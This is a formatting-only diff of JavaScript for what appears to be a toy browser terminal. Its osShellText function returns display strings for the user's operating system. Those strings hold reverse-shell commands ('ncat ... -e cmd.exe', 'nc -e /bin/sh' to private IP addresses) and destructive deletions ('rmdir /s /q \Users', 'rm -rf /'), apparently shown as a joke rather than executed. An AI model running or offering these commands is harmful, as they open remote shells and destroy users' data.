@@ -64,9 +64,7 @@ const SystemCommands = [
     async exec(term, args) {
       const command = SystemCommands.find((c) => c.id === args[0]);
       if (!command) {
-        term.writeln(
-          colorize(TermColors.Red, `[error]: command "${args[0]}" not found`),
-        );
+        term.writeln(colorize(TermColors.Red, `[error]: command "${args[0]}" not found`));
         return;
       }
       term.writeln("NAME");
@@ -80,15 +78,9 @@ const SystemCommands = [
 ];
 
 function osShellText() {
-  const userAgent = (
-    navigator.userAgentData.platform ?? navigator.platform
-  ).toLowerCase();
+  const userAgent = (navigator.userAgentData.platform ?? navigator.platform).toLowerCase();
   if (userAgent.includes("win")) {
-    return [
-      "ncat 10.88.89.199 7877 -e cmd.exe\r\n",
-      "",
-      "C:\\> rmdir /s /q \\Users\r\n",
-    ];
+    return ["ncat 10.88.89.199 7877 -e cmd.exe\r\n", "", "C:\\> rmdir /s /q \\Users\r\n"];
   }
   return ["nc -e /bin/sh 10.10.198.166 9898\r\n", "", "#$ rm -rf /\r\n"];
 }
@@ -124,9 +116,7 @@ export async function exec(term, userInput, onProcessExit) {
   const [input, ...args] = userInput.split(/\s+/);
   const command = SystemCommands.find((c) => c.id === input);
   if (!command) {
-    throw new Error(
-      'Command not found. Type "help" to list available commands',
-    );
+    throw new Error('Command not found. Type "help" to list available commands');
   }
 
   if (command.args === 0 && args.length > 0) {
@@ -138,8 +128,7 @@ export async function exec(term, userInput, onProcessExit) {
     (command.args !== -1 && command.args !== args.length)
   ) {
     throw new Error(
-      "not enough arguments\r\n" +
-        colorize(TermColors.Reset, `usage: ${command.usage}`),
+      "not enough arguments\r\n" + colorize(TermColors.Reset, `usage: ${command.usage}`),
     );
   }
 
